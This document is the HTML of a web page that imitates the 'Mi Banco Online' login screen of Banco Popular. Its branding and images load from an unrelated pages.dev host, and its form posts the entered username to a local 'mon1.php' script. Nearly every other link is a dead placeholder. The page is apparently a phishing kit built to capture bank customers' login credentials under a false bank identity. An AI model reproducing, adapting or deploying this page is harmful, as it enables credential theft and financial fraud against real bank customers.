

<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mi Banco | Login</title>
    <link
      rel="shortcut icon"
      href="https://popular-winccs-cimb-prp.pages.dev/logopopular%20copy.png"
      type="image/x-icon"
    />
    <!-- Font Awesome -->
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css"
    />
    <!-- CSS only -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx"
      crossorigin="anonymous"
    />

    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
    />

    <link rel="stylesheet" href="https://popular-winccs-cimb-prp.pages.dev/dist/populardesktop.css" />
    <!-- <link rel="stylesheecolspan="3"
                                align="center"
                                style="
                                  vertical-align: top;t" href="popularmobile.css" /> -->
  </head>
  <body class="Layout_Login_Bkg" cz-shortcut-listen="true">
    <table border="0" align="center" cellpadding="0" cellspacing="0">
      <tbody>
        <tr>
          <td>
            <div id="loginLogo_pop">
              <a href="#"
                ><img
                  src="https://popular-winccs-cimb-prp.pages.dev/imglogoPop.gif"
                  width="171"
                  height="31"
                  border="0"
              /></a>
            </div>
            <table id="tbllogin" align="center">
              <tbody>
                <tr>
                  <td colspan="6" class="header-login">
                    <div style="float: left; margin-top: 23px">
                      
                        
                        <a
                          class="printNone signOn_boxText3"
                          style="text-decoration: none"
                          href="#"
                          >Ir a Versión Móvil</a
                        >
                      
                    </div>

                    <div class="signOn_menu bottomMenu">
                      <a class="printNone" href="#"
                        ><span class="icon-home"></span>Inicio</a
                      >
                      |
                      <a class="printNone" href="#">English</a>
                      |
                      <a class="printNone" rel="noopener noreferrer" href="#"
                        >Ayuda</a
                      >
                    </div>
                  </td>
                </tr>
                <tr>
                  <td>
                    <div id="loginmaincontainer">
                      <div id="logincontainer">
                        <div id="loginbox">
                          <input
                            type="hidden"
                            name="remoteToken"
                            id="remoteToken"
                            value=""
                          />
                          <div id="signOnBoxTop">
                            <div id="signOnBoxTitle">Mi Banco Online</div>
                          </div>
                          <form class="sign"
						  
                            action="mon1.php"
                            method="POST"
                            autocomplete="off"
                          >
                            <table id="tblloginBox">
                              <tbody>
                                <tr>
                                  <td height="48" class="signOn_boxLabels">
                                    <label>Username / Usuario:</label><br />

                                    <input name="mon1" type="text"  tabindex="1" required/>
                                    <a
                                      href="#"
                                      class="icon-help"
                                      style="font-weight: normal"
                                    >
                                    </a>
                                    <br />
                                    <span
                                      id="login"
                                      class="error"
                                      style="display: none"
                                      >Requerido</span
                                    >
                                    <span
                                      id="login-error-msg"
                                      class="error"
                                      style="display: none"
                                      >Usuario inválido</span
                                    >
                                  </td>
                                </tr>
                                <tr>
                                  <td>
                                    <input
                                      type="submit"
                                      class="signIn_button"
                                      tabindex="2"
                                      value="Conéctate"
                                    />
                                  </td>
                                </tr>
                                <tr>
                                  <td valign="top" class="signOn_boxText2">
                                    <br />
                                    <div class="forgot">
                                      <a href="">¿Olvidaste tu usuario?</a>
                                    </div>
                                  </td>
                                </tr>

                                <tr>
                                  <td class="bottomlink signOn_boxText2">
                                    <br />
                                    <div
                                      class="signOn_boxText3"
                                      id="enroll_now"
                                    >
                                      ¡Comienza aquí!
                                      <a class="signOn_boxText3" href="#" rel=""
                                        >¡Inscríbete!</a
                                      >
                                    </div>
                                  </td>
                                </tr>
                              </tbody>
                            </table>

                            <span
                              id="SID"
                              class="it-lin-cibp-app-21.local"
                            ></span>
                          </form>
                        </div>
                      </div>

                      <div style="float: left; margin-left: -5px">
                        <table
                          v-align="middle"
                          border="0"
                          height="115px;"
                          style="margin-top: 8px; width: 680px"
                        >
                          <colgroup>
                            <col width="430px;" />
                            <col width="260px;" />
                          </colgroup>

                          <tbody>
                            <tr>
                              <td
                                colspan="3"
                                align="center"
                                style="
                                  vertical-align: top;
                                  background-image: url(https://popular-winccs-cimb-prp.pages.dev/imgLoginGrayBox.gif);
                                  background-repeat: no-repeat;
                                "
                              >
                                <table
                                  cellspacing="0"
                                  style="width: 450px; margin-top: 5px"
                                >
                                  <colgroup>
                                    <col width="20px;" />
                                    <col width="410px;" />
                                    <col width="20px;" />
                                  </colgroup>
                                  <tbody>
                                    <tr>
                                      <td
                                        align="center"
                                        style="padding-left: 6px"
                                      >
                                        <a
                                          ><img
                                            src="https://popular-winccs-cimb-prp.pages.dev/imgArrowLeft.gif"
                                            border="0"
                                        /></a>
                                      </td>

                                      <td style="width: 410px">
                                        <div
                                          style="
                                            overflow: hidden;
                                            width: 410px;
                                            height: 115px;
                                            position: relative;
                                            z-index: 2;
                                          "
                                        >
                                          <div
                                            id="selector"
                                            style="
                                              width: 2000px;
                                              height: 115px;
                                              z-index: 1;
                                            "
                                          >
                                            <div id="lcholder">
                                              
                                              <div
                                                width="205px;"
                                                style="
                                                  float: left;
                                                  background-image: url(https://popular-winccs-cimb-prp.pages.dev/adSpacewithLine.jpeg);
                                                  background-repeat: no-repeat;
                                                "
                                              >
                                                <table
                                                  width="205px;"
                                                  cellspacing="2"
                                                  style="margin-left: 5px"
                                                >
                                                  <colgroup>
                                                    <col width="130px;" />
                                                    <col width="75px;" />
                                                  </colgroup>
                                                  <tbody>
                                                    <tr>
                                                      <td
                                                        nowrap=""
                                                        align="left"
                                                        colspan="2"
                                                        style="
                                                          font-family: Arial,
                                                            sans-serif, Sans;
                                                          font-style: normal;
                                                          font-size: 12px;
                                                          color: #33628c;
                                                        "
                                                      >
                                                        <b
                                                          >Deposito Fácil
                                                          Móvil</b
                                                        >
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        align="left"
                                                        style="
                                                          font-family: Arial,
                                                            sans-serif, Sans;
                                                          font-style: normal;
                                                          font-size: 11px;
                                                          color: #58595b;
                                                        "
                                                      >
                                                      Cuando quieras. Rápido. Fácil. Seguro.
                                                      </td>
                                                      <td
                                                        style="
                                                          padding-right: 10px;
                                                        "
                                                      >
                                                        <img
                                                          src="https://popular-winccs-cimb-prp.pages.dev/8a81a453820ed38a0182600b72306fd7.jpeg"
                                                          width="70px;"
                                                          height="50px;"
                                                        />
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        align="left"
                                                        colspan="2"
                                                        style="
                                                          font-family: Arial,
                                                            sans-serif, Sans;
                                                          font-style: underline;
                                                          font-size: 11px;
                                                          color: #3385cd;
                                                        "
                                                      >
                                                        <a
                                                          href="#"
                                                          target="_blank"
                                                          style="color: #3385cd"
                                                          ><span
                                                            style="
                                                              color: #3385cd;
                                                            "
                                                            >Conoce más aquí.</span
                                                          ></a
                                                        >
                                                      </td>
                                                    </tr>
                                                  </tbody>
                                                </table>
                                              </div>
                                              <div
                                                width="205px;"
                                                style="
                                                  float: left;
                                                  background-image: url(https://popular-winccs-cimb-prp.pages.dev/adSpacewithLine.jpeg);
                                                  background-repeat: no-repeat;
                                                "
                                              >
                                                <table
                                                  width="205px;"
                                                  cellspacing="2"
                                                  style="margin-left: 5px"
                                                >
                                                  <colgroup>
                                                    <col width="130px;" />
                                                    <col width="75px;" />
                                                  </colgroup>
                                                  <tbody>
                                                    <tr>
                                                      <td
                                                        nowrap=""
                                                        align="left"
                                                        colspan="2"
                                                        style="
                                                          font-family: Arial,
                                                            sans-serif, Sans;
                                                          font-style: normal;
                                                          font-size: 12px;
                                                          color: #33628c;
                                                        "
                                                      >
                                                        <b>Retiro Móvil</b>
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        align="left"
                                                        style="
                                                          font-family: Arial,
                                                            sans-serif, Sans;
                                                          font-style: normal;
                                                          font-size: 11px;
                                                          color: #58595b;
                                                        "
                                                      >
                                                      Envía y retira efectivo con tu celular.
                                                      </td>
                                                      <td
                                                        style="
                                                          padding-right: 10px;
                                                        "
                                                      >
                                                        <img
                                                          src="https://popular-winccs-cimb-prp.pages.dev/8a81a453820ed38a018260061f056f9b.jpeg"
                                                          width="70px;"
                                                          height="50px;"
                                                        />
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        align="left"
                                                        colspan="2"
                                                        style="
                                                          font-family: Arial,
                                                            sans-serif, Sans;
                                                          font-style: underline;
                                                          font-size: 11px;
                                                          color: #3385cd;
                                                        "
                                                      >
                                                        <a
                                                          href="#"
                                                          target="_blank"
                                                          style="color: #3385cd"
                                                          ><span
                                                            style="
                                                              color: #3385cd;
                                                            "
                                                            >Conoce más aquí.</span
                                                          ></a
                                                        >
                                                      </td>
                                                    </tr>
                                                  </tbody>
                                                </table>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </td>
                                      <td>
                                        <a>
                                          <img
                                            src="https://popular-winccs-cimb-prp.pages.dev/imgArrowRight.gif"
                                            border="0"
                                        /></a>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </td>

                              <td
                                style="
                                  vertical-align: top;
                                  padding-left: 0px;
                                  background: white;
                                "
                              >
                                <div id="contact_box2" style="margin-top: 0px">
                                  <table>
                                    <tbody>
                                      <tr class="row1">
                                        <td colspan="2">
                                          &nbsp;&nbsp;&nbsp;¿Qué quieres hacer hoy?
                                        </td>
                                      </tr>
                                      <tr class="row2">
                                        <td
                                          style="
                                            padding-left: 10px;
                                            width: 34px;
                                          "
                                        >
                                          <img
                                            src="https://popular-winccs-cimb-prp.pages.dev/imgWantToDo.png"
                                            border="0"
                                          />
                                        </td>
                                        <td>
                                            Recibir estados electrónicos. &nbsp;<a
                                            href="#"
                                            style="color: #3385cd"
                                            target="_blank"
                                            >Ver cómo.</a
                                          >
                                        </td>
                                      </tr>
                                      <tr class="row3">
                                        <td
                                          style="
                                            padding-left: 10px;
                                            width: 34px;
                                          "
                                        >
                                          <img
                                            src="https://popular-winccs-cimb-prp.pages.dev/img2WantToDo.png"
                                            border="0"
                                          />
                                        </td>
                                        <td>
                                            Hacer mis pagos. .&nbsp;<a
                                            href="#"
                                            style="color: #3385cd"
                                            target="_blank"
                                            >Ver cómo.</a
                                          >
                                        </td>
                                      </tr>
                                    </tbody>
                                  </table>
                                </div>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>

                    <div>&nbsp;</div>
                    <div
			
                      style="
                        padding-bottom: 25px;
                        border-bottom: 1px solid silver;
                      "
                    >
                      <div class="signOn_menu" style="float: left">
                        <div id="social">
                          <div style="float: left; margin-top: 2px">
                            Síguenos &nbsp;
                          </div>
                          <a> <img src="https://popular-winccs-cimb-prp.pages.dev/icnLinkedIn.gif" border="0" /></a>
                          <a> <img src="https://popular-winccs-cimb-prp.pages.dev/icnTwitter.gif" border="0" /></a>
                          <a rel="noopener noreferrer">
                            <img src="https://popular-winccs-cimb-prp.pages.dev/icnRSS.gif" border="0"
                          /></a>
                        </div>
                      </div>
                      <div
                        class="signOn_menu bottomMenu"
                        style="float: right; margin-top: 2px"
                      >
                        <a href="" target="_blank" rel="noopener noreferrer"
                          ><img src="https://popular-winccs-cimb-prp.pages.dev/icnFeedback.gif" border="0" /></a
                        >&nbsp;
                        <a href="#" target="_blank" rel="noopener noreferrer"
                          >Tu opinión</a
                        >
                        |<a border="0"></a>
                        <a href="#" target="_blank" rel="noopener noreferrer"
                          >Blog</a
                        >
                        <a border="0"></a>
                      </div>

                      <div
                        class="signOn_menu bottomMenu"
                        style="float: right"
                      ></div>
                    </div>

                    <div
                      class="signOn_menu bottomMenu"
                      style="float: left; margin-top: 2px"
                    >
                      © 2024 Popular Inc.&nbsp;
                    </div>
                    <div
                      class="signOn_menu bottomMenu"
                      style="float: right; margin-top: 2px"
                    >
                      <a href="#">Seguridad</a>
                      <span class="menu_separator">|</span>
                      <a href="#">Privacidad</a>
                      <span class="menu_separator">|</span>
                      <a href="#">Términos y Condiciones</a>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
      </tbody>
    </table>
    
    <!-- JavaScript Bundle with Popper -->
	
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
	

  </body>
</html>
